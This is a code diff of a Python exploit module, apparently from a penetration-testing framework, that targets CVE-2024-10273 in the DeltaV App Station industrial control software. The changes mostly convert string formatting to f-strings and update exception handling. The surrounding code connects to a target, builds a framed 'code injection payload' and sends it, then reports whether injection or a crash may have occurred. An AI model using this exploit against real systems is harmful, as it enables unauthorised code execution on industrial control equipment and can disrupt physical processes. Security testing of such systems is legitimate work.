@@ -84,7 +84,7 @@ class Exploit(Exploit):
             print_info("Reference: https://nvd.nist.gov/vuln/detail/CVE-2024-10273")
             return
 
-        print_status("[CVE-2024-10273] Targeting DeltaV App Station at {}:{} ...".format(self.target, self.port))
+        print_status(f"[CVE-2024-10273] Targeting DeltaV App Station at {self.target}:{self.port} ...")
         try:
             sock = socket.socket()
             sock.settimeout(10)
@@ -101,22 +101,22 @@ class Exploit(Exploit):
             frame_length  = struct.pack("<I", len(inject_field))
             frame         = DELTAV_MAGIC + VERSION + MSG_CONFIG + frame_length + inject_field
 
-            print_status("[CVE-2024-10273] Sending code injection payload ({} bytes) ...".format(len(frame)))
+            print_status(f"[CVE-2024-10273] Sending code injection payload ({len(frame)} bytes) ...")
             sock.sendall(frame)
 
             import time; time.sleep(0.5)
             try:
                 resp = sock.recv(512)
                 if resp:
-                    print_success("[CVE-2024-10273] Response received — injection may have executed ({} bytes)".format(len(resp)))
+                    print_success(f"[CVE-2024-10273] Response received — injection may have executed ({len(resp)} bytes)")
                 else:
                     print_success("[CVE-2024-10273] No response — code injection may have triggered crash/execution")
-            except socket.timeout:
+            except TimeoutError:
                 print_warning("[CVE-2024-10273] Timeout after payload")
         except ConnectionRefusedError:
-            print_warning("[CVE-2024-10273] Port {} refused — DeltaV App Station not running".format(self.port))
+            print_warning(f"[CVE-2024-10273] Port {self.port} refused — DeltaV App Station not running")
         except Exception as exc:
-            print_error("[CVE-2024-10273] Error: {}".format(exc))
+            print_error(f"[CVE-2024-10273] Error: {exc}")
         finally:
             try:
                 sock.close()
